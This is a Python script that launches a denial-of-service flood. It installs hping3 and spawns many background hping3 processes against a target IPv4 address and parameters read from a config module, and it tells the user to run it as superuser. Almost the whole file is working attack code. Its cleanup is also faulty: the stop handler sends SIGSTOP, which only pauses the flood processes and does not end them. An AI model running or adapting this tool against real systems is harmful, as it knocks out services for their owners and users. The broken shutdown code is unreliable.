import os
import subprocess
import signal
import time
import atexit
from config import Config
from config import Bcolors

"""
Plz enter super user mode ("sudo su") to run this script.
"""

config = Config()
if config.Platform == config.Platform2:
    os.system("sudo apt-get install hping3")


class DOS:
    def __init__(self, TARGETIPv4, parameters):
        self.startTime = time.time()
        self.responseTime = []
        self.PIDs = []
        self.ATKcommands = []
        self.TARGETIPv4 = TARGETIPv4
        self.ATKPARAMETERS = parameters

    def spawnATKprocess(self):
        for i, val in enumerate(self.ATKPARAMETERS):
            for j in range(val[4]):
                self.ATKcommands.append(
                    f"hping3 {val[0]} -d {val[1]} {val[2]} {val[3]} {self.TARGETIPv4} &"
                )
        self.length = len(self.ATKcommands)
        print(
            f"{Bcolors.OKGREEN}Start DDoS attack with {self.length} processes...{Bcolors.ENDC}"
        )
        for i, val in enumerate(self.ATKcommands):
            proc = subprocess.Popen(val, shell=True)
            self.PIDs.append(proc.pid)
        # register signal handler
        signal.signal(signal.SIGINT, self.killATKprocess)
        # register exit handler
        atexit.register(self.killATKprocess)
        #
        while True:
            time.sleep(1)

    def killATKprocess(self):
        print(f"{Bcolors.OKGREEN}\nStop DoS attack...{Bcolors.ENDC}")
        for i, val in enumerate(self.PIDs):
            os.kill(val, signal.SIGSTOP)
        print(f"{Bcolors.OKGREEN}Terminated {self.length} processes.{Bcolors.ENDC}")
        print(
            f"{Bcolors.OKGREEN}Total time: {int(time.time() - self.startTime)} seconds.{Bcolors.ENDC}"
        )


if __name__ == "__main__":
    print(
        f"\n{Bcolors.OKGREEN}Start DoS attack to {config.ATKIPv4} with hping3.{Bcolors.ENDC}\n"
    )
    dos = DOS(config.ATKIPv4, config.HPING3_PARAMETERS)
    dos.spawnATKprocess()
